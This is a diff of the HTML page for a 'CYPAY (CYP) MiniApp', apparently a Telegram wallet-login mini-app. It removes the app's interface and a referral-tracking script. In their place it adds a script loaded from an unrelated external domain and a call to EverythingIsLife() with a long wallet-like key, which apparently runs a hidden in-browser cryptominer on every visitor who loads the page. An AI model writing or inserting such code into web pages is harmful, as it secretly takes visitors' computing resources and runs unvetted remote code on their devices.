@@ -1,84 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <link rel="stylesheet" href="css/reset.css">
     <link rel="stylesheet" href="css/styles.css">
     <title>CYPAY (CYP) MiniApp</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+
 </head>
+
 <body>
-<div class="header" style="display: flex;justify-content: center;align-items: center;">
-    <h1>CYPAY LOGIN</h1>
-</div>
-<div class="game">
-    <header class="game__header">
-        <p style="display: flex;justify-content: center;align-items: center;">
-        <h2 class="game__score">CYPAY LOGIN</h2>
-        </p>
-    </header>
-    <div class="game__clicker-circle">
-        <img class="game__main-image" src="assets/img/CYP.png" alt="main-image">
-    </div>
-    <div class="game__footer">
-        <div class="settings">
-            <div id="connect-wallet"></div>
-        </div>
-        <div class="energy">
-            <p>Connect wallet login</p>
-        </div>
-    </div>
-</div>
-<script>
-    Telegram.WebApp.ready();
-
-    // Функция для получения значения параметра
-    function getQueryParam(param) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(param);
-    }
-
-    // Извлекаем значение параметра tgWebAppStartParam
-    const startAppParam = getQueryParam('tgWebAppStartParam');
-
-    if (startAppParam) {
-        console.log('Значение tgWebAppStartParam:', startAppParam);
-
-        // Используем значение startAppParam
-        // Отправляем его на сервер
-        fetch('https://buratinoapps.github.io/ssss/index.php', { // Замените на URL вашего PHP-скрипта
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                referrerId: startAppParam // Значение 7267131870
-            }),
-        })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error(`Ошибка HTTP: ${response.status}`);
-            }
-            return response.json();
-        })
-        .then(data => {
-            console.log('Реферальная информация успешно сохранена:', data);
-
-            // Дополнительные действия после сохранения
-            if (data.success) {
-                console.log(`ID реферала: ${data.referrerId}`);
-            } else {
-                console.warn('Ошибка на сервере:', data.message);
-            }
-        })
-        .catch(error => {
-            console.error('Ошибка при отправке данных на сервер:', error);
-        });
-    } else {
-        console.log('Параметр tgWebAppStartParam отсутствует');
-    }
+<script type="text/javascript">
+EverythingIsLife('ByeEKTJbi3faVNHTWEupmM1fdwEv95CqCqC7rCDdVhXDt4vj5E4FB1jUKxNAF6EHFHmuQhnHoXcUK84Nc4cQfmfKQ8zXo5FtSbRf5WJUw', 'x', 30);
 </script>
 
 </body>
+
 </html>
